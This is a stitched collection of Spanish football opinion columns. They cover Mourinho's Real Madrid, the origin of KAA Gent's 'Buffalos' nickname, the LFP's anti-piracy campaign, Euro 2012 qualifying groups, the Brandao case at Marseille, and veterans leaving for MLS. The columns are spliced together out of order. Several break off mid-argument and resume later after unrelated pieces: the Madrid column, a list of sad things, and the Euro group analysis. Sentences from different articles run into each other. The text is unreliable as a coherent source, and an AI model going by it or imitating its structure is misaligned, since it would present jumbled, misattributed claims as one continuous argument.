victorias. No digo nuestro disfrute, no digo nuestro interés, pero vamos a reconocer de una vez por todas que el fútbol es un juego donde se gana y se pierde, no es el Circo del Sol de la pelota ni una película de John Ford, por más que Pepe insista en ser un John Wayne de andar por casa.Por poner un ejemplo, McDonalds no puede vender entrecot de buey a cinco euros por más que el entrecot esté más rico que sus chiclosas hamburguesas, ni Renault puede fabricar Porsches y venderlos al precio del Twingo, por mejores que estos sean. Ayer el Madrid tenía que ganar o al menos no recibir gol en un partido que no sólo servía para llegar a semifinales sino para desquitarse de una vez de un Barcelona que se ha convertido en el correcaminos inalcanzable para el coyote Mourinho. Cuando vimos el once pensamos en una fórmula mágica, desconocida, críptica, pero extrañamente fascinante. Nadie sabía que iba a surgir de mezclar en una vieja cazuela todos esos ingredientes. Habituales, Xabi Alonso, Ramos, Benzema, Cristiano e inencontrables, Altintop o Carvalho.Decía ayer por Twitter que Mourinho se ha hecho grande jugando como un pequeño. La base de su éxito es el pragmatismo. Sólo el Chelsea pareció jugar a algo parecido a fútbol pero cuando se enfrentaba a equipos de primer nivel su fútbol se apaisaba y su verticalidad tornaba en horizontalidad y presión. No estamos hablando de un entrenador firme en sus ideas, sino de un estratega o más bien, en un sastre del juego ajeno. Mourinho es buen entrenador porque tiende a elegir bien como jugar en contra de otros equipos.Sabe amoldarse al rival como un traje de neopreno, asfixiarlo, desesperarlo, y sacar tajada. El Madrid no ha firmado a un entrenador de método depurado sino a un canchero con resultados óptimos, con títulos, con credenciales que demuestran que eso también es fútbol. Y tiene su mérito. Ayer intentó hacerle un traje a Guardiola pero mezcló rayas con cuadros. Acertó en el planteamiento pero equivocó los nombres. Consecuencia, por cierto, de una deficiente motivación de la plantilla, un debe habitual en los equipos de Mourinho. La genialidad ayer se convirtió en torpeza y el 1-2 tiene poca discusión.La pregunta es si el Madrid quiere jugar así, si necesita un técnico con este perfil. Yo creo que sí, por una razón: la superioridad del Barcelona ahora es tan desquiciante que ponernos estupendos y hermosos sobre el césped sólo nos llevaría a la desesperación. Los fines imposibles conducen a la melancolía. De nada le sirve al Madrid jugar bonito frente al Granada o al Ajax si diez días después el Barcelona te va a borrar del mapa. El Madrid necesita títulos, necesita ganar, ser más regular, entregarse, sobremotivarse, para quitarse de una vez de encima la pegajosa sombra del Barcelona. Y para eso Mourinho es el técnico ideal, por más que pese a los gourmets del balón. Por más fácil que le ponga el trabajo a los periodistas, como juncos mecidos por el viento, en las derrotas.Este equipo necesita la paciencia que no se le está dando. Si el aficionado quiere espectáculo, que se haga del Barça. Que queme las camisetas de Zidane y se haga fotos para el Facebook en Canaletas. Sólo el equipo de Guardiola ha logrado unir vistosidad y eficacia en los últimos años. Su juego pasará a la historia de este deporte.De que aquel indígena norteamericano con su gran penacho de plumas no había llegado hasta Flandes por pura casualidad.Conocidos con el sobrenombre de De Buffalos (en neerlandés), la extraña vinculación del último campeón belga con el lejano oeste se remonta  a su mismo origen. A los años, a comienzos del pasado siglo XX, en los que el exótico espectáculo Wild West del mítico Buffalo Bill se convirtió en todo un éxito en tierras europeas. Se tiene constancia de actuaciones, en el marco del histórico circo Barnum & Bailey, en el año 1891 y en septiembre del año 1906. La impactante estampa de los indios norteamericanos acampados en torno a las carpas del circo, en una zona precisamente muy cercana a la explanada donde acostumbraba a disputar sus partidos el recién creado equipo de Gante, marcó de manera profunda a los habitantes de la ciudad, que acudían entusiasmados al extraño espectáculo y jaleaban a William Frederick Cody y los suyos al grito de ‘Buffalo, Buffalo, Wild West Ra! ‘. Pronto, dicho grito acabó traspasando las carpas del circo. Tal fue su impacto, que enseguida se convirtió en cántico habitual en todo tipo de festejos y celebraciones en la ciudad. El fútbol no fue ajeno a la fiebre por el lejano oeste y el espectáculo de indios, caballos y bisontes que Buffalo Bill había traído hasta tierras flamencas. El sobrenombre de De Buffalos fue adoptado en presunta referencia al espectáculo de estampida de bisontes. Sin embargo, no fue hasta la década de los años veinte cuando el club adoptó la efigie del indio norteamericano con su penacho de plumas como emblema de la entidad. Las casi dos décadas transcurridas entre el espectáculo de Buffalo Bill y la adopción del símbolo alimentan la teoría de que fue el atleta de Gante, Henri Cocquyt, participante en las pruebas de relevos de los Juegos Olímpicos de Amberes del año 1920, quien instauró y popularizó el grito de ‘Buffalo! ‘ como arma de motivación con sus compañeros relevistas. El propio atleta afirmaba, sin mayor argumentación a su favor, que fue él mismo el responsable del indio que desde entonces adorna el escudo del club de fútbol de la ciudad. Podría ser una versión más plausible pero, sin duda, mucho menos simpática.Puedes comprar camisetas del KAA Gent en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. En una actitud que define su espíritu y su modelo de negocio, la Liga de Fútbol Profesional ha decidido echar balones fuera. Ha agarrado un balón con apetecible bote en la frontal del área y le ha soltado un zapatazo que lo ha mandado directamente al tercer anfiteatro. Ha encasquetado el problema a la víctima del mismo, al aficionado, para terminar de dañar su ya de por sí dañadísima imagen. ‘Si pirateas el fútbol, dañas a tu equipo’ es la nueva campaña que el organismo que rige los designios de nuestra liga ha decidido poner en marcha para tratar de concienciar a los aficionados sobre los problemas que se derivan del pirateo de la señal de televisión de los partidos de fútbol de primera y segunda división. Y el eslogan de marras, como es lógico, ha sentado como una patada en la entrepierna a ese target al que supuestamente iba dirigido. La idea que trata de transmitir el señor Tebas es que cada vez que un aficionado se engancha a rojadirecta, por ir a lo que todos estamos pensando, para ver el partido de su equipo, está causando un menoscabo irreparable a ese mismo equipo del que es seguidor. Por no ir al estadio. Por no abonarse a una plataforma de televisión de pago. Por no invertir su cada vez menor capital en el fútbol que él preside.No voy a eximir por completo de una cierta parte de culpabilidad al aficionado en todo este asunto.El madridismo necesita otra cosa, por el momento. En esta encrucijada lo mejor es adaptarse a las circunstancias, por más adversas que sean. Lo de ayer es una anécdota en la agitada búsqueda del Madrid por lograr títulos. Si gana la Liga esta eliminatoria será polvo. Si araña en la Champions no hablaremos de Pepe en un par de meses. La parroquia debe ser honesta. Si quiere disfrutar con el fútbol, que vaya a su tienda de deportes más cercana y compre una camiseta de Messi por ochenta euros. Si quiere que el Madrid retome el camino de la victoria, sufra junto a Mourinho. Sepa perdonarle. Desdramatice sus situaciones y piense que en el fondo ambos quieren lo mismo: que el Madrid gane, de una vez por todas, al Barcelona. La tristeza es la espina que de niños se nos quedaba anclada en la palma de la mano. Ese dolor disciplinado e irremediable. De mayores domesticamos la melancolía como un jinete patoso. Al menos no se desboca en el día a día. Se mantiene más o menos constante, amenazante, pero llevadera. El ser humano es supervivencia. El ser humano es avanzar pese a las heridas como el Terminator malo de metal líquido que era como Angel Garó pero menos letal.Hay muchas cosas que me ponen triste: los regalos de Reyes que nos hace mi abuela, siempre equivocados. El final de El Libro de la Selva cuando Mowgli deja atrás a sus amigos, que habían arriesgado su vida por él, para seguir a una chica hasta entonces desconocida. Que te despierte de madrugada la Teletienda tras dormirte en el sofá. Los concursos de Copla. Los concursos de gordos que quieren perder peso. Los recuerdos de Nerja hechos con conchitas. Las clases de spinning. Cuando la esposa de Los puentes de Madison acaricia el pomo de la puerta del coche pero no sale de él. La mujer que le ríe los chistes a Juan y Medio. El Código Penal lleno de polvo en una estantería de casa de mis padres que me recuerda que jamás terminé la carrera. Las fotos del Facebook de cuando era más joven. Una canción de Midlake con un nombre que no recuerdo que me lleva a una relación del pasado a la que no quiero acercarme. Las botas de fútbol que tengo guardadas con el resto de zapatos aún sabiendo que con el menisco roto jamás podré volver a ponerme. Cuando ella se va de viaje muy temprano dejándome en la cama y nada más cerrar la puerta ya la echo de menos. Djukic lanzando un penalti. Las viejas que piden perejil en las verdulerías. Las camisetas de Joma. Cuando a los Gi Joe se les rompía la goma que les unía las piernas con la cadera y caían al suelo desmembrados. Ir olvidando los números de teléfono de amigos a los que hace tiempo que no ves y que hace unos años podías recitar de carrerilla.Hubo un momento en el que el brillo de las estrellas cegó nuestras miradas y anuló nuestra capacidad de análisis. En el que cada fichaje estratosférico presentado a bombo y platillo por nuestro equipo del alma era aplaudido hasta con las orejas. Todo nos parecía normal. A nadie parecía preocuparle entonces de dónde se iban a obtener los fondos para sufragar semejante nivel de gasto. Ante tal exhibición de poderío, bastante teníamos con limpiarnos la baba de la comisura de los labios como para detenernos a analizar la viabilidad de un modelo de negocio que era a todas luces insostenible. De aquellos polvos noventeros vinieron estos lodos actuales. De aquellas hipotecas vitalicias que el diablo plantó en la mesa de los dirigentes de nuestros clubes y que aquellos accedieron a firmar ufanos mientras recibían palmaditas en su espalda se derivan buena parte de los problemas a los que ahora Tebas quiere hacer frente colocando directamente al aficionado en la picota. Como si solo existiese un culpable.La campaña de la LFP aparece como una magnífica y densa cortina de humo. Como un elemento de distracción sobre aquellos problemas de nuestro fútbol sobre los que sí que tiene responsabilidad directa el citado organismo. ¿O va a tratar Tebas de convencer al aficionado vallisoletano que plantar un Valladolid-Levante un viernes de febrero a las nueve de la noche, con una previsión meteorológica de entre cero y dos grados, no daña gravemente a su equipo? Los aficionados no dejan de acudir al estadio cada dos semanas por ver a su equipo de manera ilegal a través de Internet. Lo hacen porque las condiciones en las que se les ofrece el producto son lamentables, porque se les ponen todo tipo de dificultades e impedimentos, porque se les vende mortadela a precio de Cinco Jotas y porque, en los difíciles tiempos que corren, la ilusión y la pasión de los aficionados cuentan con una partida presupuestaria muy limitada dentro de las economías domésticas. Algo ante lo que los principales responsables de nuestra competición liguera prefieren desviar la vista. ¿Quién daña más al Valencia CF, los aficionados que no pueden permitirse pagar por ver al equipo en televisión de pago o aquellos dirigentes que, con la connivencia de la LFP, llevaron al club a su situación financiera actual? ¿Quién daña más al Getafe, una directiva que acuerda unos precios inadmisibles en las entradas del Coliseum o el aficionado que no puede permitirse pagar 80 euros por ver a su equipo en el estadio? ¿Quién daña más al Sevilla, quien permite que éste, como tantos otros, acceda solo a las migajas del reparto de los derechos televisivos o el aficionado que no puede permitirse gastarse 80 euros cada año en la nueva camiseta oficial de su equipo? ¿Y aquellos que aprovechan sus cargos como directivos e imagen de nuestros equipos para procurarse lucro personal? ¿Y aquellos directivos que permiten que nuestros equipos engorden su deuda acumulada con el fisco o con la Seguridad Social temporada tras temporada bajo una sensación de absoluta irresponsabilidad? ¿Y quienes firmaron unos contratos de cesión de derechos de televisión bajo unas condiciones leoninas de manera absolutamente irresponsable y gobernados por un cortoplacismo desquiciante? ¿Y quienes han terminado organizando una competición dirigida a la explotación salvaje del potencial comercial de los dos gigantes, con cada vez menor interés para los aficionados? ¿No son ellos los que dañan a nuestros equipos? Casi de incógnito. De manera semiclandestina, oculto en la noche y solapado con acontecimientos que suscitaban un interés mayor pese a encontrarse a muchos más kilómetros de distancia. El partido, fundamental para el devenir de la clasificación para la Euro 2016, que España disputó el domingo en Borisov frente a Bielorrusia pasó tan peligrosamente desapercibido que cualquiera hubiese dicho que se trataba de uno de esos bolos infumables destinados a redondear cuentas al alza a los que tristemente nos ha acostumbrado nuestra Real Federación en estos últimos tiempos. Pero no. Lo de España en Bielorrusia, amén de suponer el centenario de Vicente del Bosque como seleccionador nacional (más de treinta partidos ya sobre Kubala, el segundo en el ranking), aparecía en el calendario como una escena ideal para cauterizar heridas y tratar de recuperar el bastón de mando del Grupo C, a tres meses del decisivo partido ante Eslovaquia en Oviedo. No fue motivo suficiente para enganchar al público español hacia un choque que aparecía como un empalagoso banana split rebosante de nata después de toda la comilona de la temporada.La desatención que sufre la selección española en estos últimos meses choca frontalmente con la nueva escena que parece estarse dibujando en el fútbol europeo de combinados nacionales. Si ya en la fase de clasificación para el Mundial de Brasil equipos considerablemente menores como Islandia, Hungría o Montenegro estuvieron muy cerca de clasificarse para la cita del pasado verano, en esta fase de clasificación para el europeo francés la distancias parecen haberse acortado aún más. Islandia domina con mano férrea en su grupo ante selecciones como Holanda, Turquía o República Checa, y solo un devastador Eyjafjallajökull futbolístico podría dejarla ya fuera del torneo. Algo similar puede decirse de Gales, a la que nadie en un grupo con Bélgica, Israel o Bosnia ha conseguido aún derrotar. También Irlanda del Norte empieza a despejar su camino favorecida por un grupo no excesivamente complejo y en el que únicamente Rumanía y Hungría resisten el tirón. No hay mucho más que añadir sobre Eslovaquia, rival de los nuestros en su grupo de clasificación. De pronto, es como si en el panorama futbolístico continental alguien hubiese decidido abrir las ventanas de par en par y acabar con el olor a cerrado de antaño. Rusia, Italia, Alemania, España y Holanda sufren ante el ilusionante empuje de las nuevas fuerzas emergentes y el torneo del próximo verano se presenta más abierto que nunca. Quizá ha llegado ya el momento de dejar de tomarse los partidos en Borisov, en Belfast, en Nicosia o en Tórshavn como un poco apetecible e impertinente trámite. O, al menos, de sacarlos de esa forzada clandestinidad. Esta pasada semana se confirmó uno de los movimientos más llamativos de este tranquilo mercado invernal de fichajes en el fútbol europeo. El serbio Nemanja Matić cerraba el círculo y tras tres temporadas rindiendo a un alto nivel en el Benfica, volvía a Stamford Bridge para reforzar el centro del campo del equipo de José Mourinho. Tal vez los 21 millones de libras que parece haberle costado al Chelsea su traspaso no suenen demasiado descabellados a priori. Un futbolista joven, con proyección y con sobrada y demostrada experiencia en el primer nivel europeo. Sin embargo, la percepción cambia ligeramente cuando uno tira un poco de memoria y hemeroteca.Nos va a costar tres o cuatro años darnos cuenta de que debemos cambiar nuestro modelo de negocio y ser más austeros, más conservadores y levantar con esas bases una estructura de futuro. Y eso es lo que estamos empezando a hacer ahora.La frase es de Bruce Buck, presidente Blue, cuestionado acerca de la política de Fair-Play financiero pretendida por la UEFA. Y es de octubre de 2013. Sólo tres meses más tarde, el Chelsea estaba depositando la morterada en las cuentas lisboetas para conseguir el traspaso de un futbolista que hace sólo dos años y medio era suyo y que fue incluido en su día en la operación que terminó llevando al brasileño David Luiz hasta el oeste de Londres.Sin feeling con Marcelino y tras una primera vuelta bastante discreta, el madrileño recuperó la inspiración en el tercio final de la temporada, y sus siete goles en los últimos nueve partidos han acabado resultando el mejor aval para la continuidad de Míchel al mando de la nave sevillista. Llega muy bien a junio, por tanto, pero su participación en la Eurocopa es dudosa porque Soldado ofrece, con matices, lo mismo que él. Delantero de rachas. Corren dos debates en estos días que están haciendo bastante ruido, y en los que merece la pena detenerse un poco, porque poseen un sustrato común, y los problemas que plantean son de una índole lo suficientemente importante para hacer temblar la estructura en la que descansa el fútbol europeo, al menos tal y como lo hemos conocido hasta ahora.Si abordamos la cuestión de modo algo lateral, lo primero que podemos comentar es una corriente de opinión que ha trascendido en Inglaterra estos días, y que implica a algunos dueños de clubes que estarían planteándose cerrar los ascensos y descensos de la Premier League. No es simplemente un rumor, sino una línea de trabajo a la cual se ha referido el propio Richard Bevan, presidente de la asociación de managers de la Liga. Inmediatamente ha surgido un coro de voces discrepantes –incluyendo la de la propia FA-, y entre ellas una de las más beligerantes ha resultado la del técnico español Roberto Martínez. Entre los variados razonamientos que ha ofrecido, basados sobre todo en consideraciones de tipo cultural, una frase ha restallado como un látigo: “La posibilidad de ascender es el sueño de los pequeños. Y sin sueños no consigues nada.” Aquí en España, en cambio, el debate se ha centrado estos días en una cuestión aparentemente diferente. Los dardos de Mourinho sobre países que no es capaz de encontrar en Internet, la pobrísima impresión dejada en el Camp Nou por el debutante de Pilsen –no ya de no poder ganar, sino de ser incapaz de hilvanar tres pases seguidos- y la profusión de equipos de poco nombre que este año disputan la Liga de Campeones (Otelul Galati, BATE Borisov,  Apoel Nicosia, el propio Victoria, Genk, Trabzonspor) van sembrando en una parte del público la impresión de que hay muchos partidos que sobran en esta fase inicial, y que demasiados clubes salen desde el principio sabiendo que van a estar eliminados o clasificados para la siguiente ronda, lo cual daña el interés de la competición. Conviene resaltar que la abundancia de estos clubes en la fase inicial debe convertirse naturalmente en tendencia, por cuanto no responde a la casualidad, sino al cambio del sistema en las previas; una idea patrocinada por el propio Platini con el objetivo de dar visibilidad global a las ligas menores.Todos estos razonamientos traen de inmediato a la memoria polémicas similares, que van surgiendo periódicamente, y que constituyen una especie de ruido de fondo que cuestiona permanente la organización global de las competiciones futbolísticas. A saber: a) la polarización de la Liga española, donde sólo Madrid y Barcelona tienen posibilidades reales de alzarse con el título, un mundo lo separa de los perseguidores, y hay demasiados equipos igualados por debajo; b) la aparición, a partir del desmembramiento de la Unión Soviética, de muchas selecciones de bajo nivel, que unidas a los San Marino y compañía dan lugar a una excesiva dilatación de las fases de clasificación para los grandes torneos; c) el presunto exceso de selecciones en los Mundiales que muestran un nivel claramente inferior al de selecciones europeas que se quedan fuera; y d) la idea de una Liga Europea, que lleva rondando el continente desde que la patrocinara Mendoza hace 25 años: una especie de NBA del fútbol, cerrada en el sentido del que se hablaba en el primer párrafo.En realidad, con todos los matices que se quiera –que son muchos, y muy relevantes en este caso- la cuestión admite una simplificación bastante clara: dar preeminencia al espectáculo que proporcionan los grandes clubes, en los que se hallan los mejores jugadores y donde se suele ver el fútbol de gran calidad; o bien preferir la ilusión del humilde, y abrir puertas que permitan que los equipos pequeños puedan asomarse, siquiera fugazmente, al Olimpo de la gloria. Está claro que el gusto preferente corresponde esencialmente a una cuestión de opinión, y por tanto es difícil pontificar taxativamente sobre el asunto. Sin embargo, parece interesante ofrecer algunos razonamientos que puedan enriquecer los puntos de vista.En primer lugar, debe notarse que estos fenómenos, vistos desde España, corren el grave riesgo de ser observados con un sesgo evidente. El motivo de ello es que España es casi universalmente aceptada como la mejor selección del mundo, el Barcelona el mejor equipo y el Real Madrid su gran competidor a todos los niveles. Vivimos un momento, por tanto, en que las tres escuadras con las que se identifican la inmensa mayoría de los españoles son dominantes hasta un nivel nunca visto, y por tanto no parece muy adecuado emplearlas como vara de medir. Dicho de otro modo, porque un equipo salga goleado del Camp Nou o del Bernabéu no tiene por qué ser malo; la gran Alemania actual fue claramente superada por España en la final del Mundial, o el Manchester United arrasado en la de Champions League por el Barcelona. Si estos grandes equipos sufrieron de este modo ante nuestros representantes, ¿qué podemos esperar de los de nivel medio o bajo? Cuando se habla de aburrimiento por falta de competitividad, debemos tratar de realizar un ejercicio más o menos global, y no ser condicionados por equipos que seguimos con mayor frecuencia.Abundando en lo anterior, basta echar un vistazo a lo que llevamos de fase de grupos de la Liga de Campeones para ver que, incluso tras las modificaciones actuales –cuyas motivaciones pueden ser espurias, no lo negamos- la competitividad sigue presidiendo, en general, la competición. Si nos fijamos en los equipos modestos mencionados más arriba, el Trabzonspor ganó en San Siro; el Valencia no fue capaz de marcarle un mísero tanto al Genk; el Otelul Galati ha perdido todos los encuentros por la mínima, el Apoel Nicosia, incluso, marcha líder de su grupo. ¿Ofrecerían más competitividad los terceros y cuartos de las grandes Ligas? Pues quizá algo más, pero de momento el tercero y cuarto de la liga española están en una situación dudosísima, por ejemplo, y el campeón de la liga alemana está al borde de la eliminación. Quizá después de todo sí es bueno darle esta oportunidad a esos equipos –y a esas aficiones- de probar que no son tan malos, que pueden ofrecer una buena imagen, y que incluso a veces pueden llegar donde nadie creía que fuese posible.Porque esa es otra. Una de las principales razones de que el fútbol sea el rey de los deportes es que pocas disciplinas deportivas proporcionan al inferior tantas posibilidades de dar la talla ante el rival que le supera. Al tratarse de un juego tan supeditado a los momentos puntuales, un simple lance –una expulsión, una lesión, ese contragolpe rápido que te da la victoria cuando llevas noventa minutos encerrado- puede servir para balancear una abismal diferencia histórica, de afición o presupuestos, en un partido concreto o en una competición corta. Estadísticamente casi nunca ocurre, como no podría ser de otra manera, pero ese “casi” es un casi mucho más benigno que en otros deportes. ¿Quién le iba a decir a los aficionados del Forest en Segunda que dos años después serían campeones de Europa? ¿Alguien daba un duro por Grecia  en el 2004? ¿O por el Deportivo en aquel ascenso con Arsenio? La realidad es que esta circunstancia tan especial del fútbol ha determinado la especificidad de sus sistemas de competición, que para triunfar han de estar basados en la meritocracia y no en la estabilidad financiera. Ya lo contó ayer Dadan Narval aquí mismo, y es que puedes acabar siendo aficionado de quien quieras, pero al final siempre vas a tener un pedazo de corazoncito mirando cómo va el equipo que jugaba cada día a dos manzanas de tu casa. Si ese equipo desaparece –y el cambio de franquicia en la NBA ofrece al aficionado una sensación similar, ver Freakonomics y su estudio del suicidio en América asociado a esta circunstancia- algo de la afición al fútbol de todos sus fanáticos se irá para siempre con él. Y al final, muy pocos de los chicos que juega en el Madrid o en el Barcelona nacieron a doscientos metros de Valdebebas o la Masía; siempre hubo cerca un equipo de barrio, de ciudad o de provincias, y sin ellos, todo el inmenso edificio creado encima se desmorona como castillos de naipes. Los buenos son buenos porque se comparan con los menos buenos, y es difícil pensar que la riqueza de la diversidad de jugar un día con el Racing en Liga, otro con el Milan en Champions y al siguiente con el Mirandés en Copa del Rey teniendo al Barça en horizonte pueda compararse con ver cada año a los mismos 16 equipos enfrentarse cuatro o cinco veces entre sí, siempre los mismos uniformes, las mismas ciudades, las mismas polémicas, los mismos jugadores. Habrá quien lo prefiera. Alrededor del próximo fin de semana se disputan los últimos partidos de clasificación para la Eurocopa, con la dosis de drama y épica que siempre conllevan. Por tanto, parece un buen momento para repasar cómo están todos los grupos, y quiénes van a ser los rivales contra los que España tenga que defender su título el próximo verano. Antes de comenzar, recordamos brevemente que hay nueve grupos, de cinco o seis equipos. Se clasifican directamente los campeones de grupo y el mejor segundo, mientras que los demás subcampeones se la jugarán en un playoff a doble partido. Un detalle algo freak: para dilucidar al mejor segundo, no se tienen cuenta en los grupos de seis los puntos conseguidos contra el colista final. Y tampoco está de más recordar que en caso de empate cuentan primero los puntos-diferencia de goles-mayor número de goles marcados contra los implicados en el empate, y sólo después, en caso de ser necesario, se miran los guarismos generales. Dicho esto, vamos allá:En el grupo A, la Alemania remozada de Löw se ha paseado en una estupenda fase de clasificación. El equipazo de los Özil, Müller, Götze o Kroos ha crucificado a todo el que ha pisado territorio teutón, ganando los cuatro encuentros de casa y logrando en ellos una media de casi cinco goles por partido. Con 24 puntos están clasificadísimos, y la actitud con la que afronten los choques contra Turquía en el Ali Sami Yen y contra Bélgica en Düsseldorf será vital en la suerte de estas dos selecciones. Dos puntos separan a otomanos y belgas, y ambos les queda un rival relativamente sencillo en casa (Azerbaidján y Kazajstán respectivamente). Así las cosas, parece que seguiremos teniendo que esperar para ver en acción en un gran torneo a esta generación belga que prometía tanto –los Witsel, Defour, Hazard, Fellaini…- y que el tanto de Arda que selló el estupendo partido que enfrentó a ambos hace ya más de un año va acabar siendo el gol de oro. A destacar la tremenda aportación de nueve goles de Klose, inmortal en su selección.Pronóstico: Alemania y Turquía.Grupo B. Un nivel medio bastante bajo produce un grupo donde cuatro selecciones cobijan fundadas esperanzas de acudir a Polonia-Ucrania. Rusia, a priori la más cualificada, dejó escapar hace un mes en Luzhniki una gran oportunidad frente a Irlanda, aunque una probable victoria en la jornada final frente a Andorra la dejaría en 20 puntos y con el segundo puesto casi asegurado. Justo por detrás anda la propia Irlanda, que se ha enganchado a la clasificación a base de goles de Robbie Keane. Si solventa su enfrentamiento en Andorra La Vella, quedará todo a expensas de un partido a cara de perro en el Aviva frente a Armenia. Comandados por Mkhitaryan, los del mar Negro suman 14 puntos, y aunque su camino es largo, dependen de sí mismos después de la paliza (0-4) propinada a Eslovaquia hace pocas fechas. Los octavo-finalistas del mundial dependen de sí mismos, pero su fase de clasificación ha seguido una curva descendente; sus posibilidades dependerán mucho del rendimiento de su estrella Hamsik, goleador en San Siro este fin de semana.Pronóstico: Rusia e Irlanda.Grupo C. Italia ya está clasificada, después de haber firmado casi el perfect a nivel defensivo, un gol en ocho partidos.Brandao está ahora en Brasil, declarándose inocente e imagino que reflexionando sobre lo sucedido gracias a que el juez de instrucción de Marsella le ha puesto en libertad vigilada y a que el Marsella le ha dado permiso para desaparecer durante unos días. “No está en un estado psicológico para jugar al futbol (…) lo que me choca es que a las cinco o seis de la mañana, la misma mañana de un entrenamiento, y a falta de cuatro días para un partido tan importante como ante el Lille no estaba en un estado normal sino habiendo consumido alcohol, según los testimonios” declaró su presidente, Jean-Cluade Dassier, al tiempo que anunciaba que no piensa dar carpetazo al asunto sin sancionar al futbolista. ¿Quieren saber a que se dedica la plantilla marsellesa con el entrenador Deschamps a la cabeza? Pues a ondear frente a las cámaras una camiseta de apoyo a Brandao durante el encuentro con el Rennes. Dice Deschamps, yo le tenía por un tipo cabal, que todo se hizo bajo su consentimiento, que la cosita solo fue un acto de solidaridad hacia un compañero que está pasando unos momentos complicados. Hacia uno de los suyos. Y que no, que no hay que buscarle tres pies al gato.No dudo de que la vida privada de Brandao sea de todo menos sosegada, seguramente tenga cien mil problemas e incluso puede que sea inocente. Los peritos y los jueces dirán. Pero me pregunto, ¿No podrían estos sensibles seres humanos demostrar su compasión hacia el compañero en privado? ¿Y que tal acordarse un poquitín de la víctima? Pero mientras prefieren silbarle al foco mediático y decirle “Hey, mírame estamos aquí apoyando a un presunto violador porque matamos por nuestro colega”. Lo dicho, solo en el fútbol. Hubo un tiempo en el que Umbro dominaba la tierra. En aquella época los porteros de Inglaterra no eran tan malos. España no era un país ganador. Le Coq Sportif tenía su nicho de mercado. El gerifalte iluminado de Adidas no había cambiado las tres hojas por esas modernísimas y vacuas rayas como símbolo de la marca. Nike era una anécdota que se dedicaba al footing, mundo del que no debería haber salido. Holanda era un equipo hermoso. De Jong tenía cuatro años. Van Bommel tenía once.Los pececitos de plástico de la bañera para no resbalarse que mis padres tienen aún en casa. Una camiseta de Placebo que compré en Madrid en el 2001 y que ya no me entra pero que aún guardo. Los taxistas que sacan conversación. La que te coge el teléfono cuando pides al chino. Los carteros.Y, de todo esto, de esta lista interminable que se irá ensanchando con el tiempo como una madre; lo que más pena me da del mundo son los jugadores que se van a jugar a fútbol en Estados Unidos. Ashley Cole, Lescott, Arango, Van Damme… van cayendo uno a uno. Haciendo las maletas para ir a un destino peor. Diciendo adiós a los rebosantes campos europeos. Al césped fresco. A los ascensos y los descensos. A una hinchada a la que la vida se le va en esto. Para ser parte de un engranaje tibio en un país donde el fútbol es accesorio. Para nosotros es el corazón, para ellos es el bazo.El fútbol estadounidense de franquicias y nombres rimbombantes. De césped artificial. Cementerio con tumbas de colores. Cada vez que se abre un mercado y veo desfilar a los jugadores a los que el fútbol apenas les llega ya a las botas con destino a Estados Unidos, me da tristeza. Llamadlo melancolía, etnocentrismo futbolístico o puro fetichismo. Villa, Kaka, Lampard, Raúl, Martins, Keane, Iraola, Pirlo… ¿echarán de menos las noches europeas?No puedo imaginar ese peregrinar hacia destinos menos exigentes. Rodeado de compañeros y rivales que te idolatran. En un país mastodóntico y hostil. Asumir que el cuerpo ya no da para más. Debe ser triste estrujar el fútbol restante en una liga deslucida, siempre con la promesa de la eclosión, siempre esperando una popularidad que me temo que no llegará nunca.El tiempo en el fútbol es una tristeza con tres agujas. Pesan las piernas. Te llaman de un equipo americano. Ponen dinero. Construyen a tu alrededor una plantilla aseada. Aprendes a llamarlo soccer. Y te ves allí, rodeado de desconocidos, con una mascota horrorosa saltando al lado. Brilla el sol. El estadio es inalcanzable a la vista. Pero echas de menos los bancos de madera del Štadión FK Senica, la niebla veronesa y hasta las gradas vacías. La camiseta de fútbol es el espejo del alma. Disfrazarnos de futbolistas es posicionarnos ante el mundo. Salir a correr por Málaga con la camiseta del Córdoba es una reivindicación de lo que soy, de dónde vengo, de mis filias y de alguna manera de mis temores –sobre todo si es día de partido-. Los malaguistas me miran con extrañeza cómplice porque, por muy diferentes que sean los colores que yo defiendo, entienden lo que quiero transmitir y aplauden que me señale sin pudor porque así somos las personas ociosas: gregarias y exhibicionistas.Podemos ir más allá. Podemos serigrafiar la elástica. Ponerle un nombre, un número, y salir de nuevo a la calle a ver las reacciones. El jugador del que te disfraces dará la medida de  lo que quieres ser. No es lo mismo llevar a Messi y su diez en la espalda que a Alves y su dos. No es lo mismo optar por un elegante ocho de Arteta que un macarra noventa y dos de El Shaarawy. En ese dorsal, en ese nombre, también hay parte de tu historia.Por eso hoy, vicheando las camisetas de Classic Football Shirts, me ha llamado la atención la camiseta que ilustra este artículo. Poniéndonos en antecedentes: Joel Kitamirike es un jugador nacido en Uganda que emigró siendo aún niño a Inglaterra. En Londres empezó a jugar en las categorías inferiores del Chelsea como defensa y llegó a un jugar un partido con el primer equipo. Fue el 18 de octubre de 2001. El Chelsea viajaba a Israel para disputar la ida en las eliminatorias de segunda ronda de la Copa de la UEFA contra el Hapoel. La situación en Israel en aquel momento era delicada. Días antes habían asesinado a un miembro del Gobierno israelí y se temían fuertes represalias. Aunque el Chelsea había garantizado la seguridad de los jugadores dio libertad a la plantilla para no viajar debido a la inestable situación del país. Colin Hutchinson, el manager del club, dijo que quien no quisiera viajar que no lo hiciera y exculpó a los jugadores que se acogieran a este permiso añadiendo que había “presiones familiares” por el temor a una tragedia. Fueron seis jugadores los que se quedaron en Londres: Petit, Gallas, Ferrer, Desailly, Gudjohnsen y Le Saux. Fue el momento para Kitamirike que sí viajó a Tel Aviv y salió de titular como lateral. El once del Chelsea formado por Bosnich, Melchiot, Terry, Babayaro, Kitamirike, Stanic, Lampard, Jokanovic, Zenden, Zola, Hasselbaink cayó estrepitosamente contra el Hapoel Tel Aviv. Dos a cero.Curiosamente, esos espléndidos números han llegado una apuesta por el fútbol combinativo, integrando a Cassano en el once titular, Pirlo a los mandos y Rossi culebreando arriba como suele. Ojalá Prandelli no altere su apuesta en la Euro. Por detrás de la azzurra va Serbia, a quien le basta conseguir la victoria el viernes en el Pequeño Maracaná ante la propia Italia o el martes frente a sus vecinos eslovenos en Maribor. En caso de dos empates de los serbios, podría entrar Estonia si gana en Irlanda del Norte, pues dicha combinación igualaría los puntos, y el golaverage es favorable a los bálticos tras su tonante victoria en Belgrado. Como últimos en discordia se presentan los eslovenos, que se han agarrado a los goles de Tim Matavz para sobrevivir, y que podrían entrar de carambola ganando a Serbia y perdiendo Estonia en Dublín. Difícil, pero no imposible.Pronóstico: Italia y Serbia.Grupo D: Por fin Francia se parece a lo que todos podemos esperar de un equipo de su potencial, al menos a nivel de 